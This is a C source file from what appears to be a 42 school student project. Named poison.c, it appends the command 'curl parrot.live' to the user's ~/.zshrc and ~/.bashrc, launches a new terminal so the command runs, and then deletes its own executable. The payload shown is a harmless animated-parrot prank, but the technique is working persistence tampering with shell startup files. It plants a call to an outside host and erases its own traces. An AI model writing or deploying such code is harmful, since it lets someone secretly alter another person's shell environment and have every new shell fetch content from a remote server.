/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   poison.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/06/22 01:28:09 by mgama             #+#    #+#             */
/*   Updated: 2023/06/22 03:38:14 by mgama            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../utils/process.h"

int	copy_alias(char **envp)
{
	int			i;
	int			fd;
	char		*path;
	static char	*command = "curl parrot.live";
	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};

	printf("\033[36mStart shell rc modifications...\033[0m\n");
	i = -1;
	while (file_list[++i])
	{
		path = ft_strjoin(getenv("HOME"), file_list[i]);
		if (!path)
			return (1);
		printf("opening and writing in %s\n", path);
		fd = open(path, O_CREAT | O_WRONLY | O_APPEND | O_RDONLY);
		free(path);
		if (fd < 0)
			return (1);
		dprintf(fd, "%s\n", command);
		close(fd);
	}
	printf("--------------------\n");
	return (0);
}

int	main(int ac, char **av, char **envp)
{
	char	home_buffer[PATH_MAX];
	char	*rm_cmd[] = {"open", "-a", "Terminal", NULL};

	realpath(av[0], home_buffer);
	printf("currrent file path = %s\n", home_buffer);
	copy_alias(envp);
	#if __APPLE__
	process_child(rm_cmd, envp);
	#else
	system("gnome-terminal");
	#endif /* __APPLE__ */
	remove(home_buffer);
	return (0);
}
